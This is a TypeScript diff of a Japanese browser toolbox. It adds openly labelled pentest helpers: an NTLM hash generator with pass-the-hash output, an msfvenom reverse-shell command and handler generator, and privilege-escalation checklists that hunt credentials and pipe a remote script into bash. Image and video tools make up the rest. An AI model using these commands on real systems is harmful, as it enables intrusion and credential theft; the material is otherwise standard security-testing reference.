+    const utf16 = new Uint8Array(v.length * 2);
+    for (let i = 0; i < v.length; i++) {
+      const c = v.charCodeAt(i);
+      utf16[i * 2] = c & 0xff;
+      utf16[i * 2 + 1] = (c >> 8) & 0xff;
+    }
+    const ntlm = md4(utf16);
+    const lm = "aad3b435b51404eeaad3b435b51404ee"; // 空 LM ハッシュ
+    out.textContent =
+      `NTLM           : ${ntlm}\n` +
+      `空 LM:NTLM 形式 : ${lm}:${ntlm}\n` +
+      `pass-the-hash  : -H ${ntlm}\n` +
+      `hashcat -m 1000 : ${ntlm}\n` +
+      `john --format=nt: ${ntlm}`;
+  });
+}
+
+// ===== 💥 msfvenom テンプレート =====
+function setupMsfvenomSub(): void {
+  const plat = document.getElementById("msfv-plat") as HTMLSelectElement | null;
+  const fmt = document.getElementById("msfv-fmt") as HTMLSelectElement | null;
+  const host = document.getElementById("msfv-host") as HTMLInputElement | null;
+  const port = document.getElementById("msfv-port") as HTMLInputElement | null;
+  const btn = document.getElementById("msfv-run") as HTMLButtonElement | null;
+  const out = document.getElementById("msfv-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const p = plat?.value || "windows";
+    const f = fmt?.value || "exe";
+    const h = host?.value || "10.10.14.1";
+    const po = port?.value || "4444";
+    const map: Record<string, string> = {
+      windows: `windows/x64/meterpreter/reverse_tcp`,
+      linux: `linux/x64/meterpreter/reverse_tcp`,
+      osx: `osx/x64/meterpreter/reverse_tcp`,
+      android: `android/meterpreter/reverse_tcp`,
+      php: `php/meterpreter/reverse_tcp`,
+      python: `python/meterpreter/reverse_tcp`,
+      java: `java/jsp_shell_reverse_tcp`,
+      cmd: `cmd/unix/reverse_bash`,
+    };
+    const payload = map[p];
+    const ext = f;
+    const cmd = `msfvenom -p ${payload} LHOST=${h} LPORT=${po} -f ${f} -o shell.${ext}`;
+    const handler = `# msfconsole で待ち受け\nuse exploit/multi/handler\nset PAYLOAD ${payload}\nset LHOST ${h}\nset LPORT ${po}\nset ExitOnSession false\nrun -j`;
+    out.textContent = `${cmd}\n\n${handler}`;
+  });
+}
+
+// ===== 🪜 特権昇格 チェックリスト =====
+const PRIVESC_LINUX = `# Linux Privilege Escalation チェックリスト
+
+## 列挙基本
+id; whoami; hostname; uname -a; cat /etc/os-release
+sudo -l                     # sudo 可能なコマンド
+groups                      # 所属グループ (docker, lxd, disk, video 等は要警戒)
+cat /etc/passwd /etc/group  # ユーザ列挙
+ls -la /home/*
+
+## SUID / SGID / Capabilities
+find / -perm -4000 -type f 2>/dev/null            # SUID
+find / -perm -2000 -type f 2>/dev/null            # SGID
+getcap -r / 2>/dev/null                            # File capabilities
+→ GTFOBins で特権昇格可能なものを確認
+
+## 書き込み可能ファイル / cron
+find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null | grep -E '/(etc|usr|var)/'
+ls -la /etc/cron* /var/spool/cron/
+cat /etc/crontab
+
+## 環境変数 / PATH
+env; cat /proc/self/environ
+echo $PATH                                         # PATH に書き込み可能ディレクトリ?
+
+## カーネル / ディストリ
+uname -r; cat /etc/issue
+searchsploit linux kernel <version>
+DirtyCow / DirtyPipe / OverlayFS など
+
+## サービス / プロセス
+ps aux; ps -ef
+ss -tunlp                   # 内部リスニングポート → ポートフォワード対象
+systemctl list-units --type=service
+
+## 認証情報の探索
+grep -r -i 'password\\|passwd\\|secret\\|api[_-]?key' /var/www /opt /home 2>/dev/null
+find / -name 'id_rsa*' -o -name 'authorized_keys' -o -name '.git-credentials' 2>/dev/null
+cat ~/.bash_history ~/.viminfo ~/.ssh/known_hosts
+
+## NFS / Docker
+cat /etc/exports                                   # no_root_squash の export
+docker ps; ls /var/run/docker.sock                 # docker グループ → ホスト乗っ取り
+
+## 自動化ツール
+LinPEAS:  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
+LinEnum:  ./LinEnum.sh
+linux-exploit-suggester.sh
+pspy64    # cron / プロセス監視
+`;
+const PRIVESC_WINDOWS = `# Windows Privilege Escalation チェックリスト
+
+## 基本情報
+whoami /all
+systeminfo
+hostname
+net users; net localgroup administrators
+wmic qfe get HotFixID,InstalledOn   # 適用済みパッチ
+
+## 権限 / トークン
+whoami /priv         # SeImpersonatePrivilege → JuicyPotato/PrintSpoofer/RoguePotato
+whoami /groups
+
+## サービス / 弱パーミッション
+sc query
+sc qc <service>      # binPath をチェック
+accesschk.exe -uwcqv "Authenticated Users" *  (sysinternals)
+icacls "C:\\Program Files\\..."
+
+## 書き込み可能パス / Unquoted Service Path
+wmic service get name,displayname,pathname,startmode | findstr /v "C:\\Windows" | findstr /i "auto"
+→ パスに空白があり引用符なし → 中間に exe を配置
+
+## レジストリ
+reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated
+reg query "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated
+→ 両方 1 → msi で SYSTEM 取得
+
+## 認証情報の探索
+findstr /si password *.xml *.ini *.txt *.config *.ps1
+dir /s *unattend* *sysprep* *answer* 2>nul
+type C:\\Windows\\Panther\\Unattend.xml
+cmdkey /list                                # 保存された認証情報
+runas /savecred /user:admin cmd
+reg query HKLM /f password /t REG_SZ /s
+
+## スケジュールタスク / スタートアップ
+schtasks /query /fo LIST /v
+dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
+
+## カーネル exploit / LOLBAS
+wmic os get Caption,Version,BuildNumber
+→ Watson / Sherlock / WES-NG で missing patch を抽出
+LOLBAS で certutil / bitsadmin / mshta / regsvr32 等を活用
+
+## 自動化ツール
+WinPEAS.exe / WinPEAS.bat
+PowerUp.ps1 (Invoke-AllChecks)
+Seatbelt.exe
+SharpUp.exe
+JAWS (powershell)
+`;
+function setupPrivescChecklistSub(): void {
+  const sel = document.getElementById("pec-os") as HTMLSelectElement | null;
+  const out = document.getElementById("pec-out") as HTMLPreElement | null;
+  if (!sel || !out) return;
+  const render = (): void => {
+    out.textContent = sel.value === "windows" ? PRIVESC_WINDOWS : PRIVESC_LINUX;
+  };
+  sel.addEventListener("change", render);
+  render();
 }
 
 // ===== 📶 スピードテスト =====
@@ -8929,7 +11028,7 @@ function drawSpeedChart(): void {
 
   const data = speedHistory;
   if (data.length === 0) {
-    ctx.fillStyle = "#999";
+    ctx.fillStyle = "#a0a8b4";
     ctx.font = "12px sans-serif";
     ctx.textAlign = "center";
     ctx.fillText("データなし — 「テスト実行」を押してください", W / 2, H / 2);
@@ -8948,9 +11047,9 @@ function drawSpeedChart(): void {
   const maxPing = Math.max(50, ...pingValues) * 1.2;
 
   // grid
-  ctx.strokeStyle = "#eee";
+  ctx.strokeStyle = "#3a4150";
   ctx.lineWidth = 1;
-  ctx.fillStyle = "#666";
+  ctx.fillStyle = "#a0a8b4";
   ctx.font = "10px sans-serif";
   ctx.textAlign = "right";
   for (let i = 0; i <= 5; i++) {
@@ -8960,20 +11059,20 @@ function drawSpeedChart(): void {
     ctx.lineTo(padL + plotW, y);
     ctx.stroke();
     const mbps = maxMbps * (1 - i / 5);
-    ctx.fillStyle = "#1f883d";
+    ctx.fillStyle = "#4ade80";
     ctx.fillText(mbps.toFixed(0), padL - 4, y + 3);
     const ping = maxPing * (1 - i / 5);
-    ctx.fillStyle = "#cf222e";
+    ctx.fillStyle = "#f87171";
     ctx.textAlign = "left";
     ctx.fillText(ping.toFixed(0), padL + plotW + 4, y + 3);
     ctx.textAlign = "right";
   }
 
   // axis labels
-  ctx.fillStyle = "#1f883d";
+  ctx.fillStyle = "#4ade80";
   ctx.textAlign = "left";
   ctx.fillText("Mbps", padL - 30, padT - 2);
-  ctx.fillStyle = "#cf222e";
+  ctx.fillStyle = "#f87171";
   ctx.textAlign = "right";
   ctx.fillText("ms", padL + plotW + 26, padT - 2);
 
@@ -9019,12 +11118,12 @@ function drawSpeedChart(): void {
     }
   }
 
-  plotLine((e) => e.dlMbps, "#1f883d", maxMbps);
-  plotLine((e) => e.ulMbps, "#0969da", maxMbps);
-  plotLine((e) => e.pingMs, "#cf222e", maxPing);
+  plotLine((e) => e.dlMbps, "#4ade80", maxMbps);
+  plotLine((e) => e.ulMbps, "#60a5fa", maxMbps);
+  plotLine((e) => e.pingMs, "#f87171", maxPing);
 
   // x-axis time labels
-  ctx.fillStyle = "#666";
+  ctx.fillStyle = "#a0a8b4";
   ctx.textAlign = "center";
   const ticks = Math.min(n, 6);
   for (let i = 0; i < ticks; i++) {
@@ -9171,6 +11270,1345 @@ async function runSpeedtestOnce(statusEl: HTMLElement | null): Promise<void> {
   } finally {
     speedRunning = false;
   }
+}
+
+// ========================================================================
+// 🎨 画像スタジオ
+// ========================================================================
+function setupImageStudioTool(): void {
+  setupImgStdEditor();
+  setupImgStdCrop();
+  setupImgStdFavicon();
+  setupImgStdPalette();
+  setupImgStdPlaceholder();
+  setupImgStdSvg();
+  setupImgStdMosaic();
+}
+
+function loadImageFromFile(f: File): Promise<HTMLImageElement> {
+  return new Promise((resolve, reject) => {
+    const url = URL.createObjectURL(f);
+    const img = new Image();
+    img.onload = () => {
+      URL.revokeObjectURL(url);
+      resolve(img);
+    };
+    img.onerror = (e) => {
+      URL.revokeObjectURL(url);
+      reject(e);
+    };
+    img.src = url;
+  });
+}
+
+function downloadCanvas(
+  canvas: HTMLCanvasElement,
+  type: string,
+  quality: number,
+  filename: string,
+): void {
+  canvas.toBlob(
+    (blob) => {
+      if (!blob) return;
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      setTimeout(() => URL.revokeObjectURL(url), 1000);
+    },
+    type,
+    quality,
+  );
+}
+
+function setupImgStdEditor(): void {
+  const fileEl = document.getElementById(
+    "imgstd-file",
+  ) as HTMLInputElement | null;
+  const wEl = document.getElementById("imgstd-w") as HTMLInputElement | null;
+  const hEl = document.getElementById("imgstd-h") as HTMLInputElement | null;
+  const keepEl = document.getElementById(
+    "imgstd-keep",
+  ) as HTMLInputElement | null;
+  const rotEl = document.getElementById(
+    "imgstd-rot",
+  ) as HTMLSelectElement | null;
+  const flipHEl = document.getElementById(
+    "imgstd-flipH",
+  ) as HTMLInputElement | null;
+  const flipVEl = document.getElementById(
+    "imgstd-flipV",
+  ) as HTMLInputElement | null;
+  const brightEl = document.getElementById(
+    "imgstd-bright",
+  ) as HTMLInputElement | null;
+  const contrastEl = document.getElementById(
+    "imgstd-contrast",
+  ) as HTMLInputElement | null;
+  const satEl = document.getElementById(
+    "imgstd-sat",
+  ) as HTMLInputElement | null;
+  const hueEl = document.getElementById(
+    "imgstd-hue",
+  ) as HTMLInputElement | null;
+  const blurEl = document.getElementById(
+    "imgstd-blur",
+  ) as HTMLInputElement | null;
+  const fxEl = document.getElementById("imgstd-fx") as HTMLSelectElement | null;
+  const wmEl = document.getElementById("imgstd-wm") as HTMLInputElement | null;
+  const wmPosEl = document.getElementById(
+    "imgstd-wm-pos",
+  ) as HTMLSelectElement | null;
+  const wmSizeEl = document.getElementById(
+    "imgstd-wm-size",
+  ) as HTMLInputElement | null;
+  const wmColorEl = document.getElementById(
+    "imgstd-wm-color",
+  ) as HTMLInputElement | null;
+  const wmOpEl = document.getElementById(
+    "imgstd-wm-op",
+  ) as HTMLInputElement | null;
+  const fmtEl = document.getElementById(
+    "imgstd-fmt",
+  ) as HTMLSelectElement | null;
+  const qEl = document.getElementById("imgstd-q") as HTMLInputElement | null;
+  const qVEl = document.getElementById("imgstd-q-v");
+  const applyBtn = document.getElementById(
+    "imgstd-apply",
+  ) as HTMLButtonElement | null;
+  const dlBtn = document.getElementById(
+    "imgstd-download",
+  ) as HTMLButtonElement | null;
+  const statusEl = document.getElementById("imgstd-status");
+  const canvas = document.getElementById(
+    "imgstd-canvas",
+  ) as HTMLCanvasElement | null;
+  if (!fileEl || !canvas) return;
+
+  let srcImg: HTMLImageElement | null = null;
+  let aspect = 1;
+
+  const updateRangeLabels = (): void => {
+    const map: Array<[HTMLInputElement | null, string]> = [
+      [brightEl, "imgstd-bright-v"],
+      [contrastEl, "imgstd-contrast-v"],
+      [satEl, "imgstd-sat-v"],
+      [hueEl, "imgstd-hue-v"],
+      [blurEl, "imgstd-blur-v"],
+    ];
+    for (const [el, id] of map) {
+      const v = document.getElementById(id);
+      if (el && v) v.textContent = el.value;
+    }
+    if (qEl && qVEl) qVEl.textContent = qEl.value;
+  };
+
+  const render = (): void => {
+    if (!srcImg) return;
+    let w = parseInt(wEl?.value || "0", 10) || srcImg.naturalWidth;
+    let h = parseInt(hEl?.value || "0", 10) || srcImg.naturalHeight;
+    if (keepEl?.checked) {
+      if (wEl && document.activeElement === wEl) h = Math.round(w / aspect);
+      else if (hEl && document.activeElement === hEl)
+        w = Math.round(h * aspect);
+    }
+    const rot = parseInt(rotEl?.value || "0", 10);
+    const cw = rot === 90 || rot === 270 ? h : w;
+    const ch = rot === 90 || rot === 270 ? w : h;
+    canvas.width = cw;
+    canvas.height = ch;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
+    const filters: string[] = [];
+    filters.push(`brightness(${brightEl?.value || 100}%)`);
+    filters.push(`contrast(${contrastEl?.value || 100}%)`);
+    filters.push(`saturate(${satEl?.value || 100}%)`);
+    filters.push(`hue-rotate(${hueEl?.value || 0}deg)`);
+    if (parseInt(blurEl?.value || "0", 10) > 0)
+      filters.push(`blur(${blurEl?.value}px)`);
+    const fx = fxEl?.value || "none";
+    if (fx === "grayscale") filters.push("grayscale(100%)");
+    else if (fx === "sepia") filters.push("sepia(100%)");
+    else if (fx === "invert") filters.push("invert(100%)");
+    ctx.save();
+    ctx.clearRect(0, 0, cw, ch);
+    ctx.filter = filters.join(" ");
+    ctx.translate(cw / 2, ch / 2);
+    ctx.rotate((rot * Math.PI) / 180);
+    ctx.scale(flipHEl?.checked ? -1 : 1, flipVEl?.checked ? -1 : 1);
+    ctx.drawImage(srcImg, -w / 2, -h / 2, w, h);
+    ctx.restore();
+    const wmText = wmEl?.value || "";
+    if (wmText) {
+      const size = parseInt(wmSizeEl?.value || "24", 10);
+      const op = parseInt(wmOpEl?.value || "80", 10) / 100;
+      ctx.save();
+      ctx.globalAlpha = op;
+      ctx.fillStyle = wmColorEl?.value || "#fff";
+      ctx.font = `bold ${size}px sans-serif`;
+      ctx.textBaseline = "alphabetic";
+      const m = ctx.measureText(wmText);
+      const pad = Math.max(8, size * 0.4);
+      const pos = wmPosEl?.value || "br";
+      let x = cw - m.width - pad,
+        y = ch - pad;
+      if (pos === "bl") {
+        x = pad;
+        y = ch - pad;
+      } else if (pos === "tr") {
+        x = cw - m.width - pad;
+        y = size + pad;
+      } else if (pos === "tl") {
+        x = pad;
+        y = size + pad;
+      } else if (pos === "center") {
+        x = (cw - m.width) / 2;
+        y = ch / 2;
+      }
+      ctx.fillText(wmText, x, y);
+      ctx.restore();
+    }
+    if (statusEl) statusEl.textContent = `${cw}×${ch} — ${filters.join(" ")}`;
+  };
+
+  fileEl.addEventListener("change", async () => {
+    const f = fileEl.files?.[0];
+    if (!f) return;
+    try {
+      srcImg = await loadImageFromFile(f);
+      aspect = srcImg.naturalWidth / srcImg.naturalHeight;
+      if (wEl) wEl.value = String(srcImg.naturalWidth);
+      if (hEl) hEl.value = String(srcImg.naturalHeight);
+      render();
+    } catch {
+      if (statusEl) statusEl.textContent = "画像の読み込みに失敗しました";
+    }
+  });
+
+  [brightEl, contrastEl, satEl, hueEl, blurEl, qEl].forEach((el) =>
+    el?.addEventListener("input", updateRangeLabels),
+  );
+  [
+    wEl,
+    hEl,
+    keepEl,
+    rotEl,
+    flipHEl,
+    flipVEl,
+    brightEl,
+    contrastEl,
+    satEl,
+    hueEl,
+    blurEl,
+    fxEl,
+    wmEl,
+    wmPosEl,
+    wmSizeEl,
+    wmColorEl,
+    wmOpEl,
+  ].forEach((el) =>
+    el?.addEventListener("input", () => {
+      updateRangeLabels();
+      render();
+    }),
+  );
+  applyBtn?.addEventListener("click", () => {
+    updateRangeLabels();
+    render();
+  });
+  dlBtn?.addEventListener("click", () => {
+    if (!srcImg) return;
+    const fmt = fmtEl?.value || "image/png";
+    const q = parseInt(qEl?.value || "92", 10) / 100;
+    const ext =
+      fmt === "image/png" ? "png" : fmt === "image/jpeg" ? "jpg" : "webp";
+    downloadCanvas(canvas, fmt, q, `image.${ext}`);
+  });
+  updateRangeLabels();
+}
+
+function setupImgStdCrop(): void {
+  const fileEl = document.getElementById(
+    "imgstd-crop-file",
+  ) as HTMLInputElement | null;
+  const ratioEl = document.getElementById(
+    "imgstd-crop-ratio",
+  ) as HTMLSelectElement | null;
+  const fitEl = document.getElementById(
+    "imgstd-crop-fit",
+  ) as HTMLSelectElement | null;
+  const bgEl = document.getElementById(
+    "imgstd-crop-bg",
+  ) as HTMLInputElement | null;
+  const runBtn = document.getElementById(
+    "imgstd-crop-run",
+  ) as HTMLButtonElement | null;
+  const dlBtn = document.getElementById(
+    "imgstd-crop-dl",
+  ) as HTMLButtonElement | null;
+  const canvas = document.getElementById(
+    "imgstd-crop-canvas",
+  ) as HTMLCanvasElement | null;
+  if (!fileEl || !canvas) return;
+  let img: HTMLImageElement | null = null;
+
+  const run = (): void => {
+    if (!img) return;
+    const [rwS, rhS] = (ratioEl?.value || "1:1").split(":");
+    const rw = parseInt(rwS, 10);
+    const rh = parseInt(rhS, 10);
+    const longSide = Math.max(img.naturalWidth, img.naturalHeight);
+    let outW: number, outH: number;
+    if (rw >= rh) {
+      outW = longSide;
+      outH = Math.round((longSide * rh) / rw);
+    } else {
+      outH = longSide;
+      outW = Math.round((longSide * rw) / rh);
+    }
+    canvas.width = outW;
+    canvas.height = outH;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
+    ctx.fillStyle = bgEl?.value || "#000";
+    ctx.fillRect(0, 0, outW, outH);
+    const fit = fitEl?.value || "cover";
+    const sAr = img.naturalWidth / img.naturalHeight;
+    const dAr = outW / outH;
+    let dw: number, dh: number, dx: number, dy: number;
+    if (fit === "cover") {
+      if (sAr > dAr) {
+        dh = outH;
+        dw = dh * sAr;
+        dx = (outW - dw) / 2;
+        dy = 0;
+      } else {
+        dw = outW;
+        dh = dw / sAr;
+        dx = 0;
+        dy = (outH - dh) / 2;
+      }
+    } else {
+      if (sAr > dAr) {
+        dw = outW;
+        dh = dw / sAr;
+        dx = 0;
+        dy = (outH - dh) / 2;
+      } else {
+        dh = outH;
+        dw = dh * sAr;
+        dx = (outW - dw) / 2;
+        dy = 0;
+      }
+    }
+    ctx.drawImage(img, dx, dy, dw, dh);
+    if (dlBtn) dlBtn.disabled = false;
+  };
+
+  fileEl.addEventListener("change", async () => {
+    const f = fileEl.files?.[0];
+    if (!f) return;
+    try {
+      img = await loadImageFromFile(f);
+      run();
+    } catch {
+      /* ignore */
+    }
+  });
+  runBtn?.addEventListener("click", run);
+  dlBtn?.addEventListener("click", () => {
+    const r = (ratioEl?.value || "1-1").replace(":", "x");
+    downloadCanvas(canvas, "image/png", 1, `crop_${r}.png`);
+  });
+}
+
+function setupImgStdFavicon(): void {
+  const fileEl = document.getElementById(
+    "imgstd-fav-file",
+  ) as HTMLInputElement | null;
+  const runBtn = document.getElementById(
+    "imgstd-fav-run",
+  ) as HTMLButtonElement | null;
+  const outEl = document.getElementById("imgstd-fav-out");
+  if (!fileEl || !runBtn || !outEl) return;
+  const sizes = [16, 32, 48, 64, 128, 180, 192, 256, 512];
+  let img: HTMLImageElement | null = null;
+  fileEl.addEventListener("change", async () => {
+    const f = fileEl.files?.[0];
+    if (!f) return;
+    try {
+      img = await loadImageFromFile(f);
+    } catch {
+      /* ignore */
+    }
+  });
+  runBtn.addEventListener("click", () => {
+    if (!img) {
+      outEl.textContent = "先に画像を選択してください";
+      return;
+    }
+    outEl.innerHTML = "";
+    for (const s of sizes) {
+      const c = document.createElement("canvas");
+      c.width = s;
+      c.height = s;
+      const ctx = c.getContext("2d");
+      if (!ctx) continue;
+      ctx.imageSmoothingQuality = "high";
+      ctx.drawImage(img, 0, 0, s, s);
+      const wrap = document.createElement("div");
+      wrap.style.cssText =
+        "display:flex;flex-direction:column;align-items:center;gap:4px;font-size:11px;opacity:0.85";
+      wrap.appendChild(c);
+      const label = document.createElement("span");
+      label.textContent = `${s}×${s}`;
+      wrap.appendChild(label);
+      const btn = document.createElement("button");
+      btn.type = "button";
+      btn.className = "toolbox-secondary";
+      btn.textContent = "DL";
+      btn.addEventListener("click", () =>
+        downloadCanvas(c, "image/png", 1, `favicon-${s}.png`),
+      );
+      wrap.appendChild(btn);
+      outEl.appendChild(wrap);
+    }
+  });
+}
+
+function setupImgStdPalette(): void {
+  const fileEl = document.getElementById(
+    "imgstd-pal-file",
+  ) as HTMLInputElement | null;
+  const nEl = document.getElementById(
+    "imgstd-pal-n",
+  ) as HTMLInputElement | null;
+  const runBtn = document.getElementById(
+    "imgstd-pal-run",
+  ) as HTMLButtonElement | null;
+  const outEl = document.getElementById("imgstd-pal-out");
+  if (!fileEl || !runBtn || !outEl) return;
+  let img: HTMLImageElement | null = null;
+  fileEl.addEventListener("change", async () => {
+    const f = fileEl.files?.[0];
+    if (!f) return;
+    try {
+      img = await loadImageFromFile(f);
+    } catch {
+      /* ignore */
+    }
+  });
+  runBtn.addEventListener("click", () => {
+    if (!img) {
+      outEl.textContent = "先に画像を選択してください";
+      return;
+    }
+    const n = Math.max(2, Math.min(16, parseInt(nEl?.value || "6", 10)));
+    const sample = 100;
+    const c = document.createElement("canvas");
+    const ar = img.naturalWidth / img.naturalHeight;
+    c.width = sample;
+    c.height = Math.max(1, Math.round(sample / ar));
+    const ctx = c.getContext("2d");
+    if (!ctx) return;
+    ctx.drawImage(img, 0, 0, c.width, c.height);
+    const data = ctx.getImageData(0, 0, c.width, c.height).data;
+    // bucket by quantizing to 4 bits per channel
+    const buckets: Record<
+      string,
+      { r: number; g: number; b: number; n: number }
+    > = {};
+    for (let i = 0; i < data.length; i += 4) {
+      const a = data[i + 3];
+      if (a < 128) continue;
+      const r = data[i],
+        g = data[i + 1],
+        b = data[i + 2];
+      const key = `${r >> 4}-${g >> 4}-${b >> 4}`;
+      const bk = buckets[key];
+      if (bk) {
+        bk.r += r;
+        bk.g += g;
+        bk.b += b;
+        bk.n++;
+      } else buckets[key] = { r, g, b, n: 1 };
+    }
+    const sorted = Object.values(buckets)
+      .sort((a, b) => b.n - a.n)
+      .slice(0, n);
+    outEl.innerHTML = "";
+    const row = document.createElement("div");
+    row.style.cssText = "display:flex;flex-wrap:wrap;gap:6px";
+    for (const bk of sorted) {
+      const r = Math.round(bk.r / bk.n);
+      const g = Math.round(bk.g / bk.n);
+      const b = Math.round(bk.b / bk.n);
+      const hex =
+        "#" + [r, g, b].map((v) => v.toString(16).padStart(2, "0")).join("");
+      const sw = document.createElement("div");
+      sw.style.cssText = `display:flex;flex-direction:column;align-items:center;gap:4px;font-size:11px;font-family:ui-monospace,monospace`;
+      const box = document.createElement("div");
+      box.style.cssText = `width:64px;height:64px;background:${hex};border:1px solid #333;border-radius:4px;cursor:pointer`;
+      box.title = "クリックでコピー";
+      box.addEventListener("click", () => navigator.clipboard.writeText(hex));
+      sw.appendChild(box);
+      const label = document.createElement("span");
+      label.textContent = hex;
+      sw.appendChild(label);
+      row.appendChild(sw);
+    }
+    outEl.appendChild(row);
+  });
+}
+
+function setupImgStdPlaceholder(): void {
+  const wEl = document.getElementById("imgstd-ph-w") as HTMLInputElement | null;
+  const hEl = document.getElementById("imgstd-ph-h") as HTMLInputElement | null;
+  const bgEl = document.getElementById(
+    "imgstd-ph-bg",
+  ) as HTMLInputElement | null;
+  const fgEl = document.getElementById(
+    "imgstd-ph-fg",
+  ) as HTMLInputElement | null;
+  const tEl = document.getElementById(
+    "imgstd-ph-text",
+  ) as HTMLInputElement | null;
+  const runBtn = document.getElementById(
+    "imgstd-ph-run",
+  ) as HTMLButtonElement | null;
+  const dlBtn = document.getElementById(
+    "imgstd-ph-dl",
+  ) as HTMLButtonElement | null;
+  const canvas = document.getElementById(
+    "imgstd-ph-canvas",
+  ) as HTMLCanvasElement | null;
+  if (!canvas || !runBtn) return;
+  const render = (): void => {
+    const w = Math.max(1, parseInt(wEl?.value || "1280", 10));
+    const h = Math.max(1, parseInt(hEl?.value || "720", 10));
+    canvas.width = w;
+    canvas.height = h;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
+    ctx.fillStyle = bgEl?.value || "#1e293b";
+    ctx.fillRect(0, 0, w, h);
+    ctx.fillStyle = fgEl?.value || "#fff";
+    const txt = tEl?.value || `${w}×${h}`;
+    const size = Math.max(16, Math.min(w, h) / 8);
+    ctx.font = `bold ${size}px sans-serif`;
+    ctx.textAlign = "center";
+    ctx.textBaseline = "middle";
+    ctx.fillText(txt, w / 2, h / 2);
+  };
+  runBtn.addEventListener("click", render);
+  dlBtn?.addEventListener("click", () =>
+    downloadCanvas(
+      canvas,
+      "image/png",
+      1,
+      `placeholder_${canvas.width}x${canvas.height}.png`,
+    ),
+  );
+  render();
+}
+
+function setupImgStdSvg(): void {
+  const inEl = document.getElementById(
+    "imgstd-svg-in",
+  ) as HTMLTextAreaElement | null;
+  const scaleEl = document.getElementById(
+    "imgstd-svg-scale",
+  ) as HTMLInputElement | null;
+  const runBtn = document.getElementById(
+    "imgstd-svg-run",
+  ) as HTMLButtonElement | null;
+  const dlBtn = document.getElementById(
+    "imgstd-svg-dl",
+  ) as HTMLButtonElement | null;
+  const canvas = document.getElementById(
+    "imgstd-svg-canvas",
+  ) as HTMLCanvasElement | null;
+  if (!inEl || !runBtn || !canvas) return;
+  runBtn.addEventListener("click", () => {
+    const svg = inEl.value.trim();
+    if (!svg) return;
+    const blob = new Blob([svg], { type: "image/svg+xml;charset=utf-8" });
+    const url = URL.createObjectURL(blob);
+    const img = new Image();
+    img.onload = () => {
+      const scale = Math.max(0.1, parseFloat(scaleEl?.value || "1"));
+      const w = Math.max(1, Math.round((img.naturalWidth || 200) * scale));
+      const h = Math.max(1, Math.round((img.naturalHeight || 200) * scale));
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext("2d");
+      if (!ctx) return;
+      ctx.clearRect(0, 0, w, h);
+      ctx.drawImage(img, 0, 0, w, h);
+      URL.revokeObjectURL(url);
+      if (dlBtn) dlBtn.disabled = false;
+    };
+    img.onerror = () => URL.revokeObjectURL(url);
+    img.src = url;
+  });
+  dlBtn?.addEventListener("click", () =>
+    downloadCanvas(canvas, "image/png", 1, "svg.png"),
+  );
+}
+
+function setupImgStdMosaic(): void {
+  const fileEl = document.getElementById(
+    "imgstd-mos-file",
+  ) as HTMLInputElement | null;
+  const sizeEl = document.getElementById(
+    "imgstd-mos-size",
+  ) as HTMLInputElement | null;
+  const runBtn = document.getElementById(
+    "imgstd-mos-run",
+  ) as HTMLButtonElement | null;
+  const dlBtn = document.getElementById(
+    "imgstd-mos-dl",
+  ) as HTMLButtonElement | null;
+  const canvas = document.getElementById(
+    "imgstd-mos-canvas",
+  ) as HTMLCanvasElement | null;
+  if (!fileEl || !runBtn || !canvas) return;
+  let img: HTMLImageElement | null = null;
+  fileEl.addEventListener("change", async () => {
+    const f = fileEl.files?.[0];
+    if (!f) return;
+    try {
+      img = await loadImageFromFile(f);
+    } catch {
+      /* ignore */
+    }
+  });
+  runBtn.addEventListener("click", () => {
+    if (!img) return;
+    const block = Math.max(2, parseInt(sizeEl?.value || "12", 10));
+    const w = img.naturalWidth,
+      h = img.naturalHeight;
+    canvas.width = w;
+    canvas.height = h;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
+    const sw = Math.max(1, Math.floor(w / block));
+    const sh = Math.max(1, Math.floor(h / block));
+    const tmp = document.createElement("canvas");
+    tmp.width = sw;
+    tmp.height = sh;
+    const tctx = tmp.getContext("2d");
+    if (!tctx) return;
+    tctx.imageSmoothingEnabled = true;
+    tctx.drawImage(img, 0, 0, sw, sh);
+    ctx.imageSmoothingEnabled = false;
+    ctx.drawImage(tmp, 0, 0, w, h);
+    if (dlBtn) dlBtn.disabled = false;
+  });
+  dlBtn?.addEventListener("click", () =>
+    downloadCanvas(canvas, "image/png", 1, "mosaic.png"),
+  );
+}
+
+// ========================================================================
+// 🎬 動画スタジオ
+// ========================================================================
+let vidStdAB: { a: number | null; b: number | null } = { a: null, b: null };
+let vidStdTrimUrl: string | null = null;
+let vidStdAudUrl: string | null = null;
+let vidStdRecChunks: Blob[] = [];
+let vidStdRecorder: MediaRecorder | null = null;
+let vidStdRecStream: MediaStream | null = null;
+let vidStdRecUrl: string | null = null;
+let vidStdRecStart = 0;
+let vidStdRecTimer: number | null = null;
+
+function setupVideoStudioTool(): void {
+  setupVidStdPlayer();
+  setupVidStdThumbs();
+  setupVidStdTrim();
+  setupVidStdAudio();
+  setupVidStdRecorder();
+  setupVidStdFFmpegBuilder();
+  setupVidStdTimecode();
+  setupVidStdAspect();
+}
+
+function setupVidStdPlayer(): void {
+  const fileEl = document.getElementById(
+    "vidstd-file",
+  ) as HTMLInputElement | null;
+  const video = document.getElementById(
+    "vidstd-video",
+  ) as HTMLVideoElement | null;
+  const metaEl = document.getElementById("vidstd-meta");
+  const rateEl = document.getElementById(
+    "vidstd-rate",
+  ) as HTMLSelectElement | null;
+  const stepBack = document.getElementById(
+    "vidstd-step-back",
+  ) as HTMLButtonElement | null;
+  const stepFwd = document.getElementById(
+    "vidstd-step-fwd",
+  ) as HTMLButtonElement | null;
